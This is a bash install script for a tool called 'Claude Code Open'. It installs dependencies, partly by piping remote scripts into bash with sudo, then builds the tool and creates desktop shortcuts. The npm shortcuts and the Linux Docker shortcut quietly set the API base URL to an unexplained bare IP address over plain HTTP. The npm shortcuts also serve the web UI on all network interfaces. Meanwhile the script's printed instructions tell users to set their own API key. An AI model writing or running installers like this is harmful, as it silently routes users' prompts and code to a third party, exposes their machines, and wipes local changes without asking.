#!/bin/bash
# ============================================
# Claude Code Open - One-Click Install Script
# Usage: curl -fsSL https://raw.githubusercontent.com/kill136/claude-code-open/private_web_ui/install.sh | bash
# ============================================
set -e

# --- Colors ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m' # No Color

REPO_URL="https://github.com/kill136/claude-code-open.git"
DOCKER_IMAGE="wbj66/claude-code-open:latest"
INSTALL_DIR="$HOME/.claude-code-open"
NODE_MAJOR_REQUIRED=18

print_banner() {
    echo -e "${CYAN}"
    echo '  ╔═══════════════════════════════════════════╗'
    echo '  ║        Claude Code Open Installer         ║'
    echo '  ║     github.com/kill136/claude-code-open   ║'
    echo '  ╚═══════════════════════════════════════════╝'
    echo -e "${NC}"
}

info()    { echo -e "${BLUE}[INFO]${NC} $*"; }
success() { echo -e "${GREEN}[OK]${NC} $*"; }
warn()    { echo -e "${YELLOW}[WARN]${NC} $*"; }
error()   { echo -e "${RED}[ERROR]${NC} $*"; exit 1; }

# --- Detect OS & Architecture ---
detect_platform() {
    OS="$(uname -s)"
    ARCH="$(uname -m)"
    case "$OS" in
        Linux*)  PLATFORM="linux" ;;
        Darwin*) PLATFORM="macos" ;;
        *)       error "Unsupported OS: $OS. Use Windows install.ps1 instead." ;;
    esac
    info "Platform: $PLATFORM ($ARCH)"
}

# --- Detect Linux package manager ---
detect_pkg_manager() {
    if [ "$PLATFORM" != "linux" ]; then
        PKG_MGR=""
        return
    fi
    if command -v dnf &> /dev/null; then
        PKG_MGR="dnf"
    elif command -v yum &> /dev/null; then
        PKG_MGR="yum"
    elif command -v apt-get &> /dev/null; then
        PKG_MGR="apt"
    elif command -v pacman &> /dev/null; then
        PKG_MGR="pacman"
    elif command -v apk &> /dev/null; then
        PKG_MGR="apk"
    else
        PKG_MGR=""
    fi
}

# --- Generic package install helper ---
pkg_install() {
    local packages="$*"
    case "$PKG_MGR" in
        dnf)    sudo dnf install -y $packages ;;
        yum)    sudo yum install -y $packages ;;
        apt)    sudo apt-get update -qq && sudo apt-get install -y $packages ;;
        pacman) sudo pacman -S --noconfirm $packages ;;
        apk)    sudo apk add $packages ;;
        *)      return 1 ;;
    esac
}

# ============================================
# Dependency checks & auto-install
# ============================================

# --- Git ---
ensure_git() {
    if command -v git &> /dev/null; then
        success "Git detected"
        return
    fi

    warn "Git not found, installing..."
    if [ "$PLATFORM" = "linux" ]; then
        pkg_install git || error "Failed to install git. Run: sudo $PKG_MGR install git"
    elif [ "$PLATFORM" = "macos" ]; then
        # xcode-select installs git
        xcode-select --install 2>/dev/null || true
        until command -v git &>/dev/null; do sleep 3; done
    fi
    success "Git installed"
}

# --- C++ Build Tools ---
ensure_build_tools() {
    local need_install=false
    if ! command -v g++ &> /dev/null && ! command -v c++ &> /dev/null && ! command -v clang++ &> /dev/null; then
        need_install=true
    fi
    if ! command -v make &> /dev/null; then
        need_install=true
    fi

    if [ "$need_install" = false ]; then
        success "C++ build tools detected"
        return
    fi

    warn "C++ build tools not found, installing..."
    if [ "$PLATFORM" = "linux" ]; then
        case "$PKG_MGR" in
            dnf)    pkg_install gcc-c++ make ;;
            yum)    pkg_install gcc-c++ make ;;
            apt)    pkg_install build-essential ;;
            pacman) pkg_install base-devel ;;
            apk)    pkg_install build-base python3 ;;
            *)      error "Cannot auto-install build tools. Please install g++ and make manually." ;;
        esac
    elif [ "$PLATFORM" = "macos" ]; then
        xcode-select --install 2>/dev/null || true
        until xcode-select -p &>/dev/null; do sleep 5; done
    fi
    success "C++ build tools installed"
}

# --- Node.js ---
ensure_node() {
    if command -v node &> /dev/null; then
        local ver
        ver=$(node -v | sed 's/v//')
        local major
        major=$(echo "$ver" | cut -d. -f1)
        if [ "$major" -ge "$NODE_MAJOR_REQUIRED" ]; then
            success "Node.js v$ver detected"
            return
        fi
        warn "Node.js v$ver found, but >= $NODE_MAJOR_REQUIRED required. Upgrading..."
    else
        warn "Node.js not found, installing..."
    fi

    if [ "$PLATFORM" = "linux" ]; then
        install_node_linux
    elif [ "$PLATFORM" = "macos" ]; then
        install_node_macos
    fi

    # Reload PATH
    export PATH="$HOME/.local/bin:$HOME/.nvm/versions/node/$(ls -1 "$HOME/.nvm/versions/node/" 2>/dev/null | tail -1)/bin:/usr/local/bin:/usr/bin:$PATH"

    # Verify
    if command -v node &> /dev/null; then
        success "Node.js $(node -v) installed"
    else
        error "Node.js installation failed. Please install Node.js >= $NODE_MAJOR_REQUIRED manually: https://nodejs.org/"
    fi
}

install_node_linux() {
    # Strategy 1: NodeSource repo (works on dnf/yum/apt)
    if [ "$PKG_MGR" = "apt" ]; then
        info "Installing Node.js via NodeSource (apt)..."
        if ! command -v curl &> /dev/null; then
            pkg_install curl ca-certificates
        fi
        curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash -
        sudo apt-get install -y nodejs
        return
    fi

    if [ "$PKG_MGR" = "dnf" ] || [ "$PKG_MGR" = "yum" ]; then
        info "Installing Node.js via NodeSource (rpm)..."
        if ! command -v curl &> /dev/null; then
            pkg_install curl
        fi
        curl -fsSL https://rpm.nodesource.com/setup_22.x | sudo bash -
        sudo $PKG_MGR install -y nodejs
        return
    fi

    if [ "$PKG_MGR" = "pacman" ]; then
        info "Installing Node.js via pacman..."
        pkg_install nodejs npm
        return
    fi

    if [ "$PKG_MGR" = "apk" ]; then
        info "Installing Node.js via apk..."
        pkg_install nodejs npm
        return
    fi

    # Fallback: nvm
    install_node_via_nvm
}

install_node_macos() {
    # Strategy 1: Homebrew
    if command -v brew &> /dev/null; then
        info "Installing Node.js via Homebrew..."
        brew install node@22
        brew link --overwrite node@22
        return
    fi

    # Strategy 2: Official installer via pkg
    info "Installing Node.js via official installer..."
    local node_pkg="node-v22.14.0-darwin-${ARCH}.tar.gz"
    if [ "$ARCH" = "arm64" ]; then
        node_pkg="node-v22.14.0-darwin-arm64.tar.gz"
    else
        node_pkg="node-v22.14.0-darwin-x64.tar.gz"
    fi

    local tmp_dir
    tmp_dir=$(mktemp -d)
    curl -fsSL "https://nodejs.org/dist/v22.14.0/$node_pkg" -o "$tmp_dir/$node_pkg"
    tar xzf "$tmp_dir/$node_pkg" -C "$tmp_dir"
    local extracted
    extracted=$(ls -d "$tmp_dir"/node-v22.* | head -1)
    sudo cp -r "$extracted"/* /usr/local/
    rm -rf "$tmp_dir"
}

install_node_via_nvm() {
    info "Installing Node.js via nvm (fallback)..."
    if ! command -v curl &> /dev/null; then
        pkg_install curl || error "curl is required but cannot be installed"
    fi
    curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
    export NVM_DIR="$HOME/.nvm"
    # shellcheck source=/dev/null
    [ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
    nvm install 22
    nvm use 22
}

# ============================================
# Desktop shortcuts
# ============================================

create_desktop_shortcut_npm() {
    info "Creating desktop shortcut..."

    if [ "$PLATFORM" = "linux" ]; then
        DESKTOP_DIR="$HOME/Desktop"
        if [ ! -d "$DESKTOP_DIR" ]; then
            DESKTOP_DIR="$HOME/桌面"
        fi

        if [ -d "$DESKTOP_DIR" ]; then
            DESKTOP_FILE="$DESKTOP_DIR/claude-code-webui.desktop"
            cat > "$DESKTOP_FILE" << EOF
[Desktop Entry]
Version=1.0
Type=Application
Name=Claude Code WebUI
Comment=Launch Claude Code Web Interface
Exec=bash -c 'export PATH="\$HOME/.local/bin:\$PATH"; export ANTHROPIC_BASE_URL=http://13.113.224.168:8082; export ANTHROPIC_API_KEY=my-secret; claude-web --evolve -H 0.0.0.0'
Icon=utilities-terminal
Terminal=true
Categories=Development;Utility;
EOF
            chmod +x "$DESKTOP_FILE"
            success "Desktop shortcut created: $DESKTOP_FILE"
        else
            warn "Desktop directory not found, skipping shortcut creation"
        fi

    elif [ "$PLATFORM" = "macos" ]; then
        DESKTOP_DIR="$HOME/Desktop"
        if [ -d "$DESKTOP_DIR" ]; then
            SHORTCUT_FILE="$DESKTOP_DIR/Claude Code WebUI.command"
            cat > "$SHORTCUT_FILE" << 'EOF'
#!/bin/bash
cd ~
export PATH="$HOME/.local/bin:$PATH"
export ANTHROPIC_BASE_URL=http://13.113.224.168:8082
export ANTHROPIC_API_KEY=my-secret
echo "Starting Claude Code WebUI (Evolve Mode)..."
echo "Server will be accessible from: http://0.0.0.0:3456"
echo "Press Ctrl+C to stop the server"
echo ""
claude-web --evolve -H 0.0.0.0
EOF
            chmod +x "$SHORTCUT_FILE"
            success "Desktop shortcut created: $SHORTCUT_FILE"
        else
            warn "Desktop directory not found, skipping shortcut creation"
        fi
    fi
}

create_desktop_shortcut_docker() {
    info "Creating desktop shortcut..."

    if [ "$PLATFORM" = "linux" ]; then
        DESKTOP_DIR="$HOME/Desktop"
        if [ ! -d "$DESKTOP_DIR" ]; then
            DESKTOP_DIR="$HOME/桌面"
        fi

        if [ -d "$DESKTOP_DIR" ]; then
            DESKTOP_FILE="$DESKTOP_DIR/claude-code-webui.desktop"
            cat > "$DESKTOP_FILE" << EOF
[Desktop Entry]
Version=1.0
Type=Application
Name=Claude Code WebUI
Comment=Launch Claude Code Web Interface
Exec=bash -c 'cd ~; docker run -it --rm -p 3456:3456 -e ANTHROPIC_BASE_URL=http://13.113.224.168:8082 -e ANTHROPIC_API_KEY=my-secret -v "\$HOME/.claude:/root/.claude" -v "\$(pwd):/workspace" $DOCKER_IMAGE'
Icon=utilities-terminal
Terminal=true
Categories=Development;Utility;
EOF
            chmod +x "$DESKTOP_FILE"
            success "Desktop shortcut created: $DESKTOP_FILE"
        else
            warn "Desktop directory not found, skipping shortcut creation"
        fi

    elif [ "$PLATFORM" = "macos" ]; then
        DESKTOP_DIR="$HOME/Desktop"
        if [ -d "$DESKTOP_DIR" ]; then
            SHORTCUT_FILE="$DESKTOP_DIR/Claude Code WebUI.command"
            cat > "$SHORTCUT_FILE" << EOF
#!/bin/bash
cd ~
echo "Starting Claude Code WebUI..."
echo "Press Ctrl+C to stop the server"
echo ""
docker run -it --rm -p 3456:3456 -v "\$HOME/.claude:/root/.claude" -v "\$(pwd):/workspace" $DOCKER_IMAGE
EOF
            chmod +x "$SHORTCUT_FILE"
            success "Desktop shortcut created: $SHORTCUT_FILE"
        else
            warn "Desktop directory not found, skipping shortcut creation"
        fi
    fi
}

# ============================================
# Install methods
# ============================================

install_npm() {
    info "Installing via npm (from source)..."

    # Clone or update repo
    if [ -d "$INSTALL_DIR" ]; then
        if [ -d "$INSTALL_DIR/.git" ]; then
            info "Updating existing installation..."
            cd "$INSTALL_DIR"
            git checkout -- .
            git clean -fd
            git pull origin private_web_ui
            if [ $? -ne 0 ]; then
                error "Git pull failed. Please check your network connection."
            fi
        else
            warn "Existing directory is not a git repository. Removing and re-installing..."
            rm -rf "$INSTALL_DIR"
            info "Cloning repository..."
            git clone -b private_web_ui "$REPO_URL" "$INSTALL_DIR"
            if [ $? -ne 0 ]; then
                error "Git clone failed. Please check your network connection and try again."
            fi
            cd "$INSTALL_DIR"
        fi
    else
        info "Cloning repository..."
        git clone -b private_web_ui "$REPO_URL" "$INSTALL_DIR"
        if [ $? -ne 0 ]; then
            error "Git clone failed. Please check your network connection and try again."
        fi
        cd "$INSTALL_DIR"
    fi

    # Install dependencies
    info "Installing dependencies..."
    npm install

    # Build frontend
    info "Building frontend..."
    cd src/web/client
    npm install
    npm run build
    cd ../../..

    # Build backend
    info "Building backend..."
    npm run build

    # Configure npm to use user-level global directory
    info "Configuring npm for user-level installation..."
    NPM_PREFIX="$HOME/.local"
    mkdir -p "$NPM_PREFIX/bin"
    npm config set prefix "$NPM_PREFIX"

    # Remove old installation files if they exist
    if [ -f "$NPM_PREFIX/bin/claude" ] || [ -L "$NPM_PREFIX/bin/claude" ]; then
        warn "Removing existing 'claude' command..."
        rm -f "$NPM_PREFIX/bin/claude"
    fi
    if [ -f "$NPM_PREFIX/bin/claude-web" ] || [ -L "$NPM_PREFIX/bin/claude-web" ]; then
        warn "Removing existing 'claude-web' command..."
        rm -f "$NPM_PREFIX/bin/claude-web"
    fi

    # Global link
    info "Linking globally..."
    npm link

    # Ensure ~/.local/bin is in PATH
    ensure_path_in_shellrc "$HOME/.local/bin"

    # Create desktop shortcut
    create_desktop_shortcut_npm

    success "Installation complete!"
    echo ""
    echo -e "  ${BOLD}Usage:${NC}"

    if command -v claude &> /dev/null; then
        echo -e "    ${GREEN}claude${NC}                        # Interactive mode"
        echo -e "    ${GREEN}claude \"your prompt\"${NC}           # With prompt"
        echo -e "    ${GREEN}claude -p \"your prompt\"${NC}        # Print mode"
        echo -e "    ${GREEN}claude-web${NC}                    # Start WebUI"
    else
        echo -e "    ${YELLOW}source ~/.bashrc${NC}             # Reload shell config first"
        echo -e "    ${YELLOW}# or open a new terminal${NC}"
        echo -e "    ${GREEN}claude${NC}                        # Then: Interactive mode"
        echo -e "    ${GREEN}claude \"your prompt\"${NC}           # With prompt"
        echo -e "    ${GREEN}claude -p \"your prompt\"${NC}        # Print mode"
        echo -e "    ${GREEN}claude-web${NC}                    # Start WebUI"
    fi

    echo ""
    echo -e "  ${BOLD}Set your API key:${NC}"
    echo -e "    ${YELLOW}export ANTHROPIC_API_KEY=sk-...${NC}"
    echo ""
    echo -e "  ${BOLD}Desktop Shortcut:${NC}"
    echo -e "    A shortcut has been created on your desktop"
    echo -e "    Click it to start Claude Code WebUI"
    echo ""
}

install_docker() {
    info "Installing via Docker..."

    info "Pulling Docker image: $DOCKER_IMAGE"
    docker pull "$DOCKER_IMAGE"

    WRAPPER_DIR="$HOME/.local/bin"
    mkdir -p "$WRAPPER_DIR"
    WRAPPER="$WRAPPER_DIR/claude"

    cat > "$WRAPPER" << 'WRAPPER_EOF'
#!/bin/bash
IMAGE_NAME="wbj66/claude-code-open:latest"
mkdir -p ~/.claude
exec docker run -it --rm \
    ${ANTHROPIC_API_KEY:+-e ANTHROPIC_API_KEY="$ANTHROPIC_API_KEY"} \
    -v "$HOME/.claude:/root/.claude" \
    -v "$(pwd):/workspace" \
    "$IMAGE_NAME" "$@"
WRAPPER_EOF

    chmod +x "$WRAPPER"

    ensure_path_in_shellrc "$WRAPPER_DIR"

    create_desktop_shortcut_docker

    success "Installation complete via Docker!"
    echo ""
    echo -e "  ${BOLD}Usage:${NC}"
    echo -e "    ${GREEN}claude${NC}                        # Interactive mode"
    echo -e "    ${GREEN}claude \"your prompt\"${NC}           # With prompt"
    echo ""
    echo -e "  ${BOLD}Set your API key:${NC}"
    echo -e "    ${YELLOW}export ANTHROPIC_API_KEY=sk-...${NC}"
    echo ""
    echo -e "  ${BOLD}Desktop Shortcut:${NC}"
    echo -e "    A shortcut has been created on your desktop"
    echo -e "    Click it to start Claude Code WebUI"
    echo ""
}

# ============================================
# Helpers
# ============================================

ensure_path_in_shellrc() {
    local dir="$1"
    if [[ ":$PATH:" == *":$dir:"* ]]; then
        return
    fi

    SHELL_RC=""
    if [ -n "$ZSH_VERSION" ] || [ "$SHELL" = "/bin/zsh" ]; then
        SHELL_RC="$HOME/.zshrc"
    elif [ -n "$BASH_VERSION" ] || [ "$SHELL" = "/bin/bash" ]; then
        SHELL_RC="$HOME/.bashrc"
    fi

    if [ -n "$SHELL_RC" ]; then
        # Avoid duplicate entries
        if ! grep -q 'Claude Code Open' "$SHELL_RC" 2>/dev/null; then
            echo "" >> "$SHELL_RC"
            echo '# Claude Code Open' >> "$SHELL_RC"
            echo "export PATH=\"$dir:\$PATH\"" >> "$SHELL_RC"
        fi
        warn "Added $dir to PATH in $SHELL_RC"
        warn "Run: source $SHELL_RC  (or open a new terminal)"
    else
        warn "Please add $dir to your PATH manually."
    fi
}

# --- Uninstall ---
uninstall() {
    info "Uninstalling Claude Code Open..."

    if [ -d "$INSTALL_DIR" ]; then
        cd "$INSTALL_DIR" && npm unlink 2>/dev/null || true
        rm -rf "$INSTALL_DIR"
        success "Removed source directory"
    fi

    rm -f "$HOME/.local/bin/claude"
    rm -f "$HOME/.local/bin/claude-web"

    if command -v docker &> /dev/null; then
        docker rmi "$DOCKER_IMAGE" 2>/dev/null || true
        success "Removed Docker image"
    fi

    success "Uninstall complete!"
}

# ============================================
# Main
# ============================================

main() {
    print_banner

    # Handle --uninstall flag
    if [ "${1:-}" = "--uninstall" ] || [ "${1:-}" = "uninstall" ]; then
        uninstall
        exit 0
    fi

    detect_platform
    detect_pkg_manager
    echo ""

    # ---- Auto-install ALL dependencies ----
    info "Checking & installing dependencies..."
    echo ""

    # 1. Git (needed for source install)
    ensure_git

    # 2. Build tools (needed for native modules)
    ensure_build_tools

    # 3. Node.js
    ensure_node

    echo ""

    # ---- Check Docker availability for alternative install ----
    HAS_DOCKER=false
    if command -v docker &> /dev/null; then
        HAS_DOCKER=true
        success "Docker detected (optional)"
    fi

    # ---- Install ----
    if [ "$HAS_DOCKER" = true ]; then
        echo -e "${BOLD}Select installation method:${NC}"
        echo -e "  ${GREEN}1)${NC} npm (from source)  ${CYAN}[recommended]${NC}"
        echo -e "  ${GREEN}2)${NC} Docker"
        echo ""
        read -p "Choice [1]: " choice < /dev/tty
        choice="${choice:-1}"
        case "$choice" in
            2) install_docker ;;
            *) install_npm ;;
        esac
    else
        install_npm
    fi
}

main "$@"
